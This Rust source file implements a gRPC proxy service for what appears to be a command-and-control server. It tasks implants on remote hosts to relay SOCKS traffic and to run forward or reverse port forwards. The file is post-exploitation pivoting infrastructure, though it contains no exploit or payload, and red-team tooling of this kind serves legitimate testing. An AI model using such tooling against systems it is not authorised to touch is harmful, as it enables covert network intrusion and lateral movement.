//! ProxyService gRPC implementation - SOCKS proxy and port forward management

use std::sync::Arc;
use std::time::Duration;

use dashmap::DashMap;
use tokio::sync::RwLock;
use tokio_stream::wrappers::ReceiverStream;
use tonic::{Request, Response, Status};

use common::{ImplantId, TaskId};
use protocol::{
    proxy_service_server::ProxyService, GetProxyStatsRequest, ListProxiesRequest,
    ListProxiesResponse, PortForward, ProxyState, ProxyStats, ProxyStatsUpdate,
    SocksProxy, SocksVersion, StartPortForwardRequest, StartPortForwardResponse,
    StartProxyRequest, StartProxyResponse, StopPortForwardRequest, StopPortForwardResponse,
    StopProxyRequest, StopProxyResponse, StreamProxyStatsRequest, Timestamp,
};

use crate::socks_server::{
    ProxyInstanceId, SocksProxyManager as RealSocksManager, SocksVersion as RealSocksVersion,
};
use crate::state::ServerState;

/// Unique ID for a proxy instance
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub struct ProxyId(uuid::Uuid);

impl ProxyId {
    pub fn new() -> Self {
        Self(uuid::Uuid::new_v4())
    }

    pub fn as_bytes(&self) -> &[u8; 16] {
        self.0.as_bytes()
    }

    pub fn from_bytes(bytes: &[u8]) -> Result<Self, &'static str> {
        if bytes.len() != 16 {
            return Err("proxy ID must be 16 bytes");
        }
        let arr: [u8; 16] = bytes.try_into().unwrap();
        Ok(Self(uuid::Uuid::from_bytes(arr)))
    }
}

impl Default for ProxyId {
    fn default() -> Self {
        Self::new()
    }
}

/// Internal tracking for an active SOCKS proxy
#[derive(Debug, Clone)]
struct ActiveProxy {
    id: ProxyId,
    implant_id: ImplantId,
    #[allow(dead_code)]
    task_id: TaskId,
    bind_host: String,
    bind_port: u32,
    version: i32,
    state: i32,
    started_at: i64,
    bytes_in: u64,
    bytes_out: u64,
    active_connections: u32,
    total_connections: u64,
}

/// Internal tracking for an active port forward
#[derive(Debug, Clone)]
struct ActivePortForward {
    id: ProxyId,
    implant_id: ImplantId,
    #[allow(dead_code)]
    task_id: TaskId,
    local_host: String,
    local_port: u32,
    remote_host: String,
    remote_port: u32,
    reverse: bool,
    state: i32,
    started_at: i64,
    bytes_in: u64,
    bytes_out: u64,
}

/// Proxy manager state
pub struct ProxyManager {
    proxies: DashMap<ProxyId, ActiveProxy>,
    port_forwards: DashMap<ProxyId, ActivePortForward>,
    /// Map from task_id to proxy_id for correlating task results
    task_to_proxy: DashMap<TaskId, ProxyId>,
}

impl ProxyManager {
    pub fn new() -> Self {
        Self {
            proxies: DashMap::new(),
            port_forwards: DashMap::new(),
            task_to_proxy: DashMap::new(),
        }
    }
}

impl Default for ProxyManager {
    fn default() -> Self {
        Self::new()
    }
}

pub struct ProxyServiceImpl {
    state: Arc<ServerState>,
    manager: Arc<RwLock<ProxyManager>>,
    /// Real SOCKS proxy manager that binds TCP listeners
    socks_manager: Arc<RealSocksManager>,
}

impl ProxyServiceImpl {
    pub fn new(state: Arc<ServerState>) -> Self {
        Self {
            state,
            manager: Arc::new(RwLock::new(ProxyManager::new())),
            socks_manager: Arc::new(RealSocksManager::new()),
        }
    }

    /// Parse implant ID from bytes
    fn parse_implant_id(bytes: &[u8]) -> Result<ImplantId, Status> {
        ImplantId::from_bytes(bytes)
            .map_err(|e| Status::invalid_argument(format!("invalid implant_id: {e}")))
    }

    /// Parse proxy ID from bytes
    fn parse_proxy_id(bytes: &[u8]) -> Result<ProxyId, Status> {
        ProxyId::from_bytes(bytes)
            .map_err(|e| Status::invalid_argument(format!("invalid proxy_id: {e}")))
    }

    /// Verify implant exists and is taskable
    async fn verify_implant(&self, implant_id: ImplantId) -> Result<(), Status> {
        let record = self
            .state
            .db
            .implants()
            .get(implant_id)
            .await
            .map_err(|e| Status::internal(e.to_string()))?
            .ok_or_else(|| Status::not_found(format!("implant {} not found", implant_id)))?;

        if !record.state.is_taskable() {
            return Err(Status::failed_precondition(format!(
                "implant {} is not in a taskable state (state={})",
                implant_id, record.state
            )));
        }

        Ok(())
    }

    /// Dispatch a task to start a SOCKS proxy on the implant
    async fn dispatch_start_proxy(
        &self,
        implant_id: ImplantId,
        bind_host: &str,
        bind_port: u32,
        version: i32,
    ) -> Result<(ProxyId, TaskId), Status> {
        use protocol::{MeshSocksConnect, MeshTask, Task, mesh_task};

        let proxy_id = ProxyId::new();
        let task_id = TaskId::new();
        let now = chrono::Utc::now().timestamp_millis();

        // Create a mesh task to start the SOCKS server
        // Note: We use MeshSocksConnect for initiating the proxy channel
        let socks_connect = MeshSocksConnect {
            channel_id: proxy_id.0.as_u128() as u32, // Use lower 32 bits as channel ID
            target_host: bind_host.to_string(),
            target_port: bind_port,
        };

        let mesh_task = MeshTask {
            operation: Some(mesh_task::Operation::SocksConnect(socks_connect)),
        };

        let task_data = prost::Message::encode_to_vec(&mesh_task);

        let proto_task = Task {
            task_id: Some(task_id.into()),
            task_type: "socks_proxy".to_string(),
            task_data,
            issued_at: Some(Timestamp::from_millis(now)),
            operator_id: None,
        };

        self.state.enqueue_task(implant_id, proto_task);

        // Track the proxy
        let manager = self.manager.write().await;
        manager.proxies.insert(
            proxy_id,
            ActiveProxy {
                id: proxy_id,
                implant_id,
                task_id,
                bind_host: bind_host.to_string(),
                bind_port,
                version,
                state: ProxyState::Starting as i32,
                started_at: now,
                bytes_in: 0,
                bytes_out: 0,
                active_connections: 0,
                total_connections: 0,
            },
        );
        manager.task_to_proxy.insert(task_id, proxy_id);

        tracing::info!(
            proxy_id = %proxy_id.0,
            task_id = %task_id,
            implant_id = %implant_id,
            bind = %format!("{}:{}", bind_host, bind_port),
            "SOCKS proxy task dispatched"
        );

        Ok((proxy_id, task_id))
    }
}

#[tonic::async_trait]
impl ProxyService for ProxyServiceImpl {
    async fn start_proxy(
        &self,
        request: Request<StartProxyRequest>,
    ) -> Result<Response<StartProxyResponse>, Status> {
        let req = request.into_inner();

        let implant_id = Self::parse_implant_id(
            &req.implant_id.ok_or_else(|| Status::invalid_argument("missing implant_id"))?.value,
        )?;

        self.verify_implant(implant_id).await?;

        let bind_host = if req.bind_host.is_empty() {
            "127.0.0.1".to_string()
        } else {
            req.bind_host
        };

        let bind_port = if req.bind_port == 0 { 1080 } else { req.bind_port };

        let version = if req.version == SocksVersion::Unspecified as i32 {
            SocksVersion::SocksVersion5 as i32
        } else {
            req.version
        };

        let real_version = if version == SocksVersion::SocksVersion5 as i32 {
            RealSocksVersion::Socks5
        } else {
            RealSocksVersion::Socks4
        };

        // Start the real SOCKS listener
        let state_for_connect = Arc::clone(&self.state);
        let state_for_data = Arc::clone(&self.state);
        let implant_id_clone = implant_id;

        let instance_id = self
            .socks_manager
            .start_proxy(
                implant_id,
                &bind_host,
                bind_port as u16,
                real_version,
                // Connect callback: dispatch SocksTask::Connect to the implant
                move |connect_req| {
                    use protocol::{SocksConnect, SocksTask, Task, Timestamp, socks_task};

                    tracing::info!(
                        channel_id = connect_req.channel_id,
                        target = %format!("{}:{}", connect_req.target_host, connect_req.target_port),
                        "SOCKS connect request - dispatching to implant"
                    );

                    let socks_task = SocksTask {
                        operation: Some(socks_task::Operation::Connect(SocksConnect {
                            channel_id: connect_req.channel_id,
                            target_host: connect_req.target_host,
                            target_port: connect_req.target_port as u32,
                        })),
                    };

                    let task_id = common::TaskId::new();
                    let proto_task = Task {
                        task_id: Some(task_id.into()),
                        task_type: "socks".to_string(),
                        task_data: prost::Message::encode_to_vec(&socks_task),
                        issued_at: Some(Timestamp::now()),
                        operator_id: None,
                    };

                    state_for_connect.enqueue_task(implant_id, proto_task);
                },
                // Data callback: dispatch SocksTask::Data or Disconnect to relay through implant
                move |_instance_id, data| {
                    use protocol::{SocksData, SocksDisconnect, SocksTask, Task, Timestamp, socks_task};

                    let operation = if data.eof {
                        tracing::trace!(
                            channel_id = data.channel_id,
                            "SOCKS EOF - dispatching disconnect to implant"
                        );
                        socks_task::Operation::Disconnect(SocksDisconnect {
                            channel_id: data.channel_id,
                        })
                    } else {
                        if data.data.is_empty() {
                            return;
                        }
                        tracing::trace!(
                            channel_id = data.channel_id,
                            len = data.data.len(),
                            "SOCKS data to tunnel - dispatching to implant"
                        );
                        socks_task::Operation::Data(SocksData {
                            channel_id: data.channel_id,
                            data: data.data,
                        })
                    };

                    let socks_task = SocksTask {
                        operation: Some(operation),
                    };

                    let task_id = common::TaskId::new();
                    let proto_task = Task {
                        task_id: Some(task_id.into()),
                        task_type: "socks".to_string(),
                        task_data: prost::Message::encode_to_vec(&socks_task),
                        issued_at: Some(Timestamp::now()),
                        operator_id: None,
                    };

                    state_for_data.enqueue_task(implant_id, proto_task);
                },
            )
            .map_err(|e| Status::internal(format!("failed to start SOCKS proxy: {}", e)))?;

        // Also track in internal manager for stats/listing
        let (proxy_id, task_id) = self
            .dispatch_start_proxy(implant_id_clone, &bind_host, bind_port, version)
            .await?;

        tracing::info!(
            proxy_id = %proxy_id.0,
            instance_id = %instance_id.0,
            bind = %format!("{}:{}", bind_host, bind_port),
            "SOCKS proxy started with real listener"
        );

        Ok(Response::new(StartProxyResponse {
            proxy_id: Some(protocol::Uuid {
                value: proxy_id.as_bytes().to_vec(),
            }),
            task_id: Some(task_id.into()),
        }))
    }

    async fn stop_proxy(
        &self,
        request: Request<StopProxyRequest>,
    ) -> Result<Response<StopProxyResponse>, Status> {
        let req = request.into_inner();

        let proxy_id = Self::parse_proxy_id(
            &req.proxy_id.ok_or_else(|| Status::invalid_argument("missing proxy_id"))?.value,
        )?;

        let manager = self.manager.write().await;

        if let Some((_, proxy)) = manager.proxies.remove(&proxy_id) {
            // Stop the real SOCKS listener
            let instance_id = ProxyInstanceId(proxy_id.0);
            self.socks_manager.stop_proxy(instance_id);

            // Dispatch stop task to implant
            use protocol::{MeshSocksData, MeshTask, Task, mesh_task};

            let task_id = TaskId::new();
            let now = chrono::Utc::now().timestamp_millis();

            // Send EOF to close the SOCKS channel
            let socks_data = MeshSocksData {
                channel_id: proxy_id.0.as_u128() as u32,
                data: vec![],
                eof: true,
            };

            let mesh_task = MeshTask {
                operation: Some(mesh_task::Operation::SocksData(socks_data)),
            };

            let task_data = prost::Message::encode_to_vec(&mesh_task);

            let proto_task = Task {
                task_id: Some(task_id.into()),
                task_type: "socks_proxy_stop".to_string(),
                task_data,
                issued_at: Some(Timestamp::from_millis(now)),
                operator_id: None,
            };

            self.state.enqueue_task(proxy.implant_id, proto_task);

            tracing::info!(
                proxy_id = %proxy_id.0,
                implant_id = %proxy.implant_id,
                "SOCKS proxy stopped"
            );

            Ok(Response::new(StopProxyResponse { success: true }))
        } else {
            Err(Status::not_found(format!("proxy {} not found", proxy_id.0)))
        }
    }

    async fn list_proxies(
        &self,
        request: Request<ListProxiesRequest>,
    ) -> Result<Response<ListProxiesResponse>, Status> {
        let req = request.into_inner();
        let manager = self.manager.read().await;

        let filter_implant = req.implant_id.as_ref().and_then(|id| {
            Self::parse_implant_id(&id.value).ok()
        });

        let filter_state = match req.state {
            Some(s) if s != ProxyState::Unspecified as i32 => Some(s),
            _ => None,
        };

        let proxies: Vec<SocksProxy> = manager
            .proxies
            .iter()
            .filter(|entry| {
                let proxy = entry.value();
                if let Some(implant_id) = filter_implant {
                    if proxy.implant_id != implant_id {
                        return false;
                    }
                }
                if let Some(state_filter) = filter_state {
                    if proxy.state != state_filter {
                        return false;
                    }
                }
                true
            })
            .map(|entry| {
                let p = entry.value();
                SocksProxy {
                    id: Some(protocol::Uuid {
                        value: p.id.as_bytes().to_vec(),
                    }),
                    implant_id: Some(protocol::Uuid {
                        value: p.implant_id.as_bytes().to_vec(),
                    }),
                    bind_host: p.bind_host.clone(),
                    bind_port: p.bind_port,
                    version: p.version,
                    state: p.state,
                    started_at: Some(Timestamp::from_millis(p.started_at)),
                    bytes_in: p.bytes_in,
                    bytes_out: p.bytes_out,
                    active_connections: p.active_connections,
                    total_connections: p.total_connections,
                }
            })
            .collect();

        let port_forwards: Vec<PortForward> = manager
            .port_forwards
            .iter()
            .filter(|entry| {
                let pf = entry.value();
                if let Some(implant_id) = filter_implant {
                    if pf.implant_id != implant_id {
                        return false;
                    }
                }
                if let Some(state_filter) = filter_state {
                    if pf.state != state_filter {
                        return false;
                    }
                }
                true
            })
            .map(|entry| {
                let pf = entry.value();
                PortForward {
                    id: Some(protocol::Uuid {
                        value: pf.id.as_bytes().to_vec(),
                    }),
                    implant_id: Some(protocol::Uuid {
                        value: pf.implant_id.as_bytes().to_vec(),
                    }),
                    local_host: pf.local_host.clone(),
                    local_port: pf.local_port,
                    remote_host: pf.remote_host.clone(),
                    remote_port: pf.remote_port,
                    reverse: pf.reverse,
                    state: pf.state,
                    started_at: Some(Timestamp::from_millis(pf.started_at)),
                    bytes_in: pf.bytes_in,
                    bytes_out: pf.bytes_out,
                }
            })
            .collect();

        Ok(Response::new(ListProxiesResponse {
            proxies,
            port_forwards,
        }))
    }

    async fn get_proxy_stats(
        &self,
        request: Request<GetProxyStatsRequest>,
    ) -> Result<Response<ProxyStats>, Status> {
        let req = request.into_inner();

        let proxy_id = Self::parse_proxy_id(
            &req.proxy_id.ok_or_else(|| Status::invalid_argument("missing proxy_id"))?.value,
        )?;

        let manager = self.manager.read().await;

        let proxy = manager
            .proxies
            .get(&proxy_id)
            .ok_or_else(|| Status::not_found(format!("proxy {} not found", proxy_id.0)))?;

        // Get connection info from the real SOCKS proxy instance
        let instance_id = ProxyInstanceId(proxy_id.0);
        let connections = if let Some(instance) = self.socks_manager.get(instance_id) {
            instance
                .get_connections()
                .into_iter()
                .map(|conn| protocol::ProxyConnection {
                    connection_id: conn.channel_id,
                    remote_addr: conn.remote_addr,
                    target_addr: conn.target_addr,
                    bytes_in: conn.bytes_in,
                    bytes_out: conn.bytes_out,
                    connected_at: Some(Timestamp::from_millis(conn.connected_at)),
                })
                .collect()
        } else {
            vec![]
        };

        Ok(Response::new(ProxyStats {
            proxy_id: Some(protocol::Uuid {
                value: proxy.id.as_bytes().to_vec(),
            }),
            bytes_in: proxy.bytes_in,
            bytes_out: proxy.bytes_out,
            active_connections: proxy.active_connections,
            total_connections: proxy.total_connections,
            connections,
        }))
    }

    type StreamProxyStatsStream = ReceiverStream<Result<ProxyStatsUpdate, Status>>;

    async fn stream_proxy_stats(
        &self,
        request: Request<StreamProxyStatsRequest>,
    ) -> Result<Response<Self::StreamProxyStatsStream>, Status> {
        let req = request.into_inner();
        let (tx, rx) = tokio::sync::mpsc::channel(64);

        let filter_proxy = req.proxy_id.as_ref().and_then(|id| {
            Self::parse_proxy_id(&id.value).ok()
        });

        let interval_ms = if req.interval_ms == 0 { 1000 } else { req.interval_ms };
        let manager = Arc::clone(&self.manager);

        tokio::spawn(async move {
            let mut interval = tokio::time::interval(Duration::from_millis(interval_ms as u64));

            loop {
                interval.tick().await;

                let mgr = manager.read().await;

                for entry in mgr.proxies.iter() {
                    let proxy = entry.value();

                    if let Some(filter_id) = filter_proxy {
                        if proxy.id != filter_id {
                            continue;
                        }
                    }

                    let update = ProxyStatsUpdate {
                        proxy_id: Some(protocol::Uuid {
                            value: proxy.id.as_bytes().to_vec(),
                        }),
                        bytes_in: proxy.bytes_in,
                        bytes_out: proxy.bytes_out,
                        active_connections: proxy.active_connections,
                        timestamp: Some(Timestamp::now()),
                    };

                    if tx.send(Ok(update)).await.is_err() {
                        return; // Client disconnected
                    }
                }
            }
        });

        Ok(Response::new(ReceiverStream::new(rx)))
    }

    async fn start_port_forward(
        &self,
        request: Request<StartPortForwardRequest>,
    ) -> Result<Response<StartPortForwardResponse>, Status> {
        let req = request.into_inner();

        let implant_id = Self::parse_implant_id(
            &req.implant_id.ok_or_else(|| Status::invalid_argument("missing implant_id"))?.value,
        )?;

        self.verify_implant(implant_id).await?;

        let forward_id = ProxyId::new();
        let task_id = TaskId::new();
        let now = chrono::Utc::now().timestamp_millis();

        // Dispatch PortForwardTask to the implant before tracking locally
        {
            use protocol::{PortForwardStart, PortForwardTask, Task, Timestamp, port_forward_task};

            let pf_task = PortForwardTask {
                operation: Some(port_forward_task::Operation::Start(PortForwardStart {
                    bind_host: req.local_host.clone(),
                    bind_port: req.local_port,
                    forward_host: req.remote_host.clone(),
                    forward_port: req.remote_port,
                    reverse: req.reverse,
                })),
            };

            let proto_task = Task {
                task_id: Some(task_id.into()),
                task_type: "portfwd".to_string(),
                task_data: prost::Message::encode_to_vec(&pf_task),
                issued_at: Some(Timestamp::from_millis(now)),
                operator_id: None,
            };

            self.state.enqueue_task(implant_id, proto_task);
        }

        // Track the port forward
        let manager = self.manager.write().await;
        manager.port_forwards.insert(
            forward_id,
            ActivePortForward {
                id: forward_id,
                implant_id,
                task_id,
                local_host: req.local_host.clone(),
                local_port: req.local_port,
                remote_host: req.remote_host.clone(),
                remote_port: req.remote_port,
                reverse: req.reverse,
                state: ProxyState::Starting as i32,
                started_at: now,
                bytes_in: 0,
                bytes_out: 0,
            },
        );

        tracing::info!(
            forward_id = %forward_id.0,
            task_id = %task_id,
            implant_id = %implant_id,
            local = %format!("{}:{}", req.local_host, req.local_port),
            remote = %format!("{}:{}", req.remote_host, req.remote_port),
            reverse = req.reverse,
            "Port forward task dispatched to implant"
        );

        Ok(Response::new(StartPortForwardResponse {
            forward_id: Some(protocol::Uuid {
                value: forward_id.as_bytes().to_vec(),
            }),
            task_id: Some(task_id.into()),
        }))
    }

    async fn stop_port_forward(
        &self,
        request: Request<StopPortForwardRequest>,
    ) -> Result<Response<StopPortForwardResponse>, Status> {
        let req = request.into_inner();

        let forward_id = Self::parse_proxy_id(
            &req.forward_id.ok_or_else(|| Status::invalid_argument("missing forward_id"))?.value,
        )?;

        let manager = self.manager.write().await;

        if manager.port_forwards.remove(&forward_id).is_some() {
            tracing::info!(forward_id = %forward_id.0, "Port forward stopped");
            Ok(Response::new(StopPortForwardResponse { success: true }))
        } else {
            Err(Status::not_found(format!(
                "port forward {} not found",
                forward_id.0
            )))
        }
    }
}
